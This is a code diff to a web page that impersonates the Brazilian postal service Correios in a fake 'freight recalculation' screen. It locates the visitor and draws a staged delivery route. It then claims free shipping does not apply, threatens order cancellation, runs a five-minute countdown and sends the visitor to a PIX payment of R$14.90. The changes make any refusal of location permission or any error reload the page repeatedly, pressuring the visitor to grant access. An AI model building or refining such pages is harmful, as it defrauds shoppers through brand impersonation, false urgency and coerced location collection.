@@ -22,6 +22,48 @@
             flex-direction: column;
             overflow: hidden;
         }
+        /* Tela de carregamento BRANCA com animação */
+        .splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.8s ease;
+        }
+        .splash-screen img {
+            width: 160px;
+            height: auto;
+            filter: none; /* Logo original, sem inverter cores */
+            margin-bottom: 40px;
+        }
+        .splash-screen .loader {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid #003366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-top: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .splash-screen p {
+            color: #003366;
+            margin-top: 24px;
+            font-size: 1rem;
+            font-weight: 500;
+            letter-spacing: 1px;
+        }
+        /* Header Correios */
         .correios-header {
             background: #003366;
             padding: 12px 16px;
@@ -56,6 +98,7 @@
             width: 100%;
             background: #cbd5e1;
         }
+        /* Overlay de carregamento durante cálculo */
         .recalc-overlay {
             position: absolute;
             bottom: 20px;
@@ -84,9 +127,6 @@
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
         .recalc-text {
             font-weight: bold;
             font-size: 1rem;
@@ -96,6 +136,7 @@
             font-size: 0.75rem;
             color: #555;
         }
+        /* Popup de upsell */
         .upsell-popup {
             position: fixed;
             bottom: 0;
@@ -204,9 +245,6 @@
             cursor: pointer;
             color: #003366;
         }
-        .error-status {
-            color: #d32f2f;
-        }
         .security-footer {
             display: flex;
             justify-content: center;
@@ -215,43 +253,6 @@
             font-size: 0.65rem;
             color: #4a5568;
             flex-wrap: wrap;
-        }
-        /* Overlay de localização obrigatória - corrigido para funcionar no celular */
-        .location-required {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(10px);
-            z-index: 2000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            color: white;
-            padding: 40px;
-            box-sizing: border-box;
-        }
-        .location-required.hide {
-            display: none;
-        }
-        .location-required button {
-            background: #ffcc00;
-            color: #003366;
-            border: none;
-            padding: 14px 28px;
-            border-radius: 60px;
-            font-weight: bold;
-            font-size: 1rem;
-            margin-top: 20px;
-            cursor: pointer;
-            width: 100%;
-            max-width: 250px;
-        }
-        .location-required p {
-            margin-bottom: 10px;
         }
         @media (max-width: 480px) {
             .logo-area img {
@@ -267,11 +268,18 @@
     </style>
 </head>
 <body>
+    <!-- Tela de carregamento BRANCA -->
+    <div id="splash" class="splash-screen">
+        <img src="https://panela-tiktokshop.vercel.app/images/correios2-removebg-preview.png" alt="Correios">
+        <div class="loader"></div>
+        <p>Carregando sistema logístico...</p>
+    </div>
+
     <div class="correios-header">
         <div class="logo-area">
             <img src="https://panela-tiktokshop.vercel.app/images/correios2-removebg-preview.png" alt="Correios">
         </div>
-        <div class="correios-sub">Recálculo logístico</div>
+        <div class="correios-sub">Recálculo de frete</div>
     </div>
     <div class="map-container">
         <div id="map"></div>
@@ -298,26 +306,26 @@
             <span><i class="fas fa-headset"></i> Dúvidas? Suporte</span>
         </div>
     </div>
-    <div id="locationOverlay" class="location-required hide">
-        <div>
-            <i class="fas fa-map-marker-alt" style="font-size: 3rem; margin-bottom: 16px;"></i>
-            <h2>Permissão de localização necessária</h2>
-            <p>Para calcular o frete e evitar o cancelamento do seu pedido, precisamos saber onde você está.</p>
-            <button id="allowLocationBtn"><i class="fas fa-location-dot"></i> Permitir localização</button>
-            <p style="font-size:0.7rem; margin-top:16px;">Após permitir, aguarde alguns segundos.</p>
-        </div>
-    </div>
 
     <script>
         (function() {
             const CD = { lat: -23.5475, lng: -46.6361 };
             let map = null;
             let currentRouteLayer = null, animatingLine = null;
-            let lastDestCoords = null;
             let lastCity = "";
             let lastUsedCEP = null;
             let countdownInterval = null;
-            let locationRetryCount = 0;
+
+            // Oculta a tela de carregamento após 2 segundos
+            setTimeout(() => {
+                const splash = document.getElementById('splash');
+                if (splash) {
+                    splash.style.opacity = '0';
+                    setTimeout(() => {
+                        if (splash) splash.style.display = 'none';
+                    }, 800);
+                }
+            }, 2000);
 
             function initMap() {
                 if (map) return;
@@ -333,14 +341,14 @@
                 });
                 L.marker([CD.lat, CD.lng], { icon: cdIcon }).addTo(map);
             }
-            
+
             function clearRoutes() {
                 if (currentRouteLayer) map.removeLayer(currentRouteLayer);
                 if (animatingLine) map.removeLayer(animatingLine);
                 currentRouteLayer = null;
                 animatingLine = null;
             }
-            
+
             function decodePolyline(encoded) {
                 let points = [], idx = 0, len = encoded.length, lat = 0, lng = 0;
                 while (idx < len) {
@@ -356,7 +364,7 @@
                 }
                 return points;
             }
-            
+
             async function animateRoute(points, duration = 2200) {
                 return new Promise((resolve) => {
                     if (!points.length) { resolve(); return; }
@@ -379,7 +387,7 @@
                     requestAnimationFrame(frame);
                 });
             }
-            
+
             async function getAddressFromViaCEP(cep) {
                 const clean = cep.replace(/\D/g, '');
                 if (clean.length !== 8) throw new Error('CEP inválido');
@@ -391,7 +399,7 @@
                 const query = `${cidade}, ${uf}, Brasil`;
                 return { query, cidade, uf };
             }
-            
+
             async function geocodeByCity(cityUfQuery) {
                 const url = `https://nominatim.openstreetmap.org/search?q=${encodeURIComponent(cityUfQuery)}&format=json&limit=1&countrycodes=br&addressdetails=1`;
                 const resp = await fetch(url, { headers: { 'User-Agent': 'CorreiosApp/1.0' } });
@@ -399,7 +407,7 @@
                 if (!data || data.length === 0) throw new Error('Geocode falhou');
                 return { lat: parseFloat(data[0].lat), lng: parseFloat(data[0].lon) };
             }
-            
+
             async function reverseGeocodeDetails(lat, lng) {
                 const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&extratags=1&namedetails=1`;
                 const resp = await fetch(url, { headers: { 'User-Agent': 'CorreiosApp/1.0' } });
@@ -411,7 +419,7 @@
                 const cep = addr.postcode ? addr.postcode.replace(/\D/g, '') : null;
                 return { city, state, cep };
             }
-            
+
             async function getRoadRoute(start, end) {
                 try {
                     const url = `https://router.project-osrm.org/route/v1/driving/${start.lng},${start.lat};${end.lng},${end.lat}?overview=full&geometries=polyline`;
@@ -434,7 +442,7 @@
                     return points;
                 }
             }
-            
+
             function showOverlay(msg, sub) {
                 const ov = document.getElementById('recalcOverlay');
                 document.getElementById('recalcText').innerHTML = `<i class="fas fa-sync-alt"></i> ${msg}`;
@@ -442,7 +450,7 @@
                 ov.classList.remove('hide');
             }
             function hideOverlay() { document.getElementById('recalcOverlay').classList.add('hide'); }
-            
+
             function startCountdown(seconds = 300) {
                 let remaining = seconds;
                 const timerElement = document.getElementById('countdownTimer');
@@ -461,22 +469,22 @@
                     }
                 }, 1000);
             }
-            
+
             function stopCountdown() {
                 if (countdownInterval) clearInterval(countdownInterval);
             }
-            
+
             function showUpsell(cidade) {
                 document.getElementById('popupAddress').innerHTML = `<i class="fas fa-location-dot"></i> O frete grátis não se aplica à sua região (<strong>${cidade}</strong>). Para evitar o cancelamento do pedido, confirme o pagamento do frete abaixo.`;
                 document.getElementById('upsellPopup').classList.add('show');
                 startCountdown(300);
             }
-            
+
             function hideUpsell() {
                 document.getElementById('upsellPopup').classList.remove('show');
                 stopCountdown();
             }
-            
+
             async function trackWithCEP(cep, fromStorage = false) {
                 hideUpsell();
                 if (!cep) return;
@@ -489,7 +497,6 @@
                         showOverlay("Localizando coordenadas...", "Geocodificação");
                     }
                     const coords = await geocodeByCity(query);
-                    lastDestCoords = coords;
                     if (!fromStorage) {
                         showOverlay("Traçando rota real...", "OSRM Routing");
                     }
@@ -511,24 +518,23 @@
                 } catch (err) {
                     console.error(err);
                     hideOverlay();
-                    alert("Não foi possível calcular a rota. Verifique sua conexão e tente novamente.");
+                    alert("Erro ao calcular rota. Recarregue a página.");
+                    location.reload();
                 }
             }
-            
-            // Função corrigida para solicitar localização e tratar erros sem loop infinito
+
             function requestLocationAndTrack() {
                 if (!navigator.geolocation) {
-                    alert("Seu navegador não suporta geolocalização. Use um navegador moderno.");
+                    alert("Seu navegador não suporta geolocalização. Recarregue a página.");
+                    location.reload();
                     return;
                 }
-                showOverlay("Solicitando permissão...", "Precisamos da sua localização para calcular o frete");
-                
+                showOverlay("Solicitando permissão...", "Precisamos da sua localização");
+
                 navigator.geolocation.getCurrentPosition(async (position) => {
-                    // Sucesso: esconde overlay e continua
-                    document.getElementById('locationOverlay').classList.add('hide');
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
-                    showOverlay("Obtendo endereço...", "Buscando informações de localização");
+                    showOverlay("Obtendo endereço...", "Buscando informações");
                     try {
                         const details = await reverseGeocodeDetails(lat, lng);
                         if (!details.city) throw new Error("Cidade não identificada");
@@ -538,14 +544,12 @@
                             const query = `${details.city}, ${details.state}, Brasil`;
                             const coords = await geocodeByCity(query);
                             lastCity = details.city;
-                            lastDestCoords = coords;
                             const routePoints = await getRoadRoute(CD, coords);
                             const bounds = L.latLngBounds([CD, coords]);
                             map.fitBounds(bounds, { padding: [60, 60] });
                             const destIcon = L.divIcon({
                                 html: '<div style="background:#00a650; width:34px; height:34px; border-radius:50%; border:2px solid #FFCC00; display:flex; align-items:center; justify-content:center;"><i class="fas fa-flag-checkered" style="color:white;"></i></div>',
-                                iconSize: [34,34],
-                                className: 'custom-icon'
+                                iconSize: [34,34]
                             });
                             if (window.destMarker) map.removeLayer(window.destMarker);
                             window.destMarker = L.marker([coords.lat, coords.lng], { icon: destIcon }).addTo(map);
@@ -556,52 +560,43 @@
                     } catch (err) {
                         console.error(err);
                         hideOverlay();
-                        alert("Não foi possível obter seu endereço com precisão. Tente recarregar a página.");
+                        alert("Não foi possível obter seu endereço. Recarregue a página.");
+                        location.reload();
                     }
                 }, (error) => {
                     hideOverlay();
                     console.error("Geolocation error:", error);
                     if (error.code === 1) {
-                        // Permissão negada: mostra o overlay de bloqueio e um botão para tentar novamente
-                        document.getElementById('locationOverlay').classList.remove('hide');
-                        // Adiciona um evento temporário para o botão, evitando múltiplos listeners
-                        const allowBtn = document.getElementById('allowLocationBtn');
-                        // Remove listeners antigos para não duplicar
-                        const newBtn = allowBtn.cloneNode(true);
-                        allowBtn.parentNode.replaceChild(newBtn, allowBtn);
-                        newBtn.addEventListener('click', () => {
-                            document.getElementById('locationOverlay').classList.add('hide');
-                            // Pequeno delay para garantir que o overlay sumiu
-                            setTimeout(() => {
-                                requestLocationAndTrack();
-                            }, 100);
-                        });
+                        alert("Você negou a permissão de localização. A página será recarregada para você permitir.");
+                        location.reload();
                     } else if (error.code === 2) {
-                        alert("Localização indisponível. Tente ativar o GPS do seu dispositivo e recarregue a página.");
-                    } else if (error.code === 3) {
-                        alert("Tempo limite excedido. Tente novamente em um local com melhor sinal.");
+                        alert("Localização indisponível. Ative o GPS e recarregue a página.");
+                        location.reload();
                     } else {
-                        alert("Erro desconhecido ao obter localização. Tente recarregar a página.");
+                        alert("Erro ao obter localização. Recarregue a página.");
+                        location.reload();
                     }
                 }, { enableHighAccuracy: true, timeout: 10000 });
             }
-            
+
             function initialize() {
                 initMap();
                 const savedCEP = localStorage.getItem('savedCEP');
                 if (savedCEP) {
                     trackWithCEP(savedCEP, true);
                 } else {
-                    requestLocationAndTrack();
+                    setTimeout(() => {
+                        requestLocationAndTrack();
+                    }, 2500);
                 }
             }
-            
+
             function redirectToPix() {
                 const cep = lastUsedCEP || "desconhecido";
                 const url = `https://checkout.exemplo.com/pix?order_id=${Date.now()}&upsell=frete_priority&value=14.90&origin=correios_mapa&cep=${cep}&cidade=${encodeURIComponent(lastCity)}`;
                 window.location.href = url;
             }
-            
+
             window.addEventListener('DOMContentLoaded', () => {
                 initialize();
                 document.getElementById('btnFinalizar').addEventListener('click', redirectToPix);
